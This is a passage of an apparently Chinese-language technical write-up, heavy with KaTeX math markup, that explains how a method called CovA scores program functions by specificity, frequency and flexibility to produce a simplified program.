encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>首先得到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>所有函数,对每个函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>,计算三个分数:<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo>−</mo><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mo separator="true">,</mo><mi>f</mi><mi>r</mi><mi>e</mi><mi>q</mi><mi>u</mi><mi>e</mi><mi>n</mi><mi>c</mi><mi>y</mi><mo>−</mo><mi>f</mi><mi>r</mi><mi>e</mi><mi>q</mi><mo separator="true">,</mo><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>i</mi><mi>b</mi><mi>i</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo>−</mo><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">specificity-spec,frequency-freq,flexibility-flex</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">ec</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">re</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">cy</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">re</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">ibi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span></span></span></span></eq>,用map存储;分数详解在后面</li></ol></li><li><ol start="2"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>对这些分数进行标准化,然后计算归一化分数的平均值左右增强分数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>u</mi><mi>g</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">aug(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">ug</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq> <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>u</mi><mi>g</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>s</mi><mi>p</mi><mi>e</mi><msub><mi>c</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mi>r</mi><mi>e</mi><msub><mi>q</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mi>l</mi><mi>e</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><mn>3</mn></mfrac></mrow><annotation encoding="application/x-tex">aug(f) = \frac{spec_n(f)+freq_n(f)+flex_n(f)}{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">ug</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">re</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq> ,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><msub><mi>c</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mi>r</mi><mi>e</mi><msub><mi>q</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mi>l</mi><mi>e</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">spec_n(f),freq_n(f),flex_n(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">re</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq>分别表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mi>r</mi><mi>e</mi><mi>q</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">spec(f),freq(f),flex(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">ec</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">re</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq>的标准化值</li></ol></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>对函数按照增强分数进行排序然后生成一个简化的程序,该简化程序包含(1) 经过输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>后精简的代码,和(2) 与前<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>o</mi><msub><mi>p</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">top_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>个函数相关的代码</li></ol></li></ul></li><li><strong>分数详解</strong><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Specificity</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Sp</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>(特异性值):<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>通过静态分析,更具体说是以来分析计算得到,表现了函数与程序具体特点的相关程度<ul><li>为了计算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Specificity</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Sp</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>构建了一个函数调用图,对每个函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>计算一个指标,该指标基于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>依赖函数的数量<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>n</mi><mo>−</mo><mi>i</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(fan-in)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">in</span><span class="mclose">)</span></span></span></span></eq>和 依赖<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>的函数的数量<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>n</mi><mo>−</mo><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(fan-out)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></eq>,最后<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Specificity</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Sp</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>计算公式如下 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><mi>u</mi><mi>t</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><mi>N</mi></mfrac><mo>×</mo><mfrac><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mfrac><mi>N</mi><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mfrac><mo stretchy="false">)</mo></mrow><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">spec(f) = 1 - util(f) = 1 - \frac{fanin(f) }{N} \times \frac{\log(\frac{N}{fanout(f)+1})}{\log(N)} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">ec</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">anin</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.7183em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7823em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">an</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></eq>是函数的总数;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>n</mi><mo 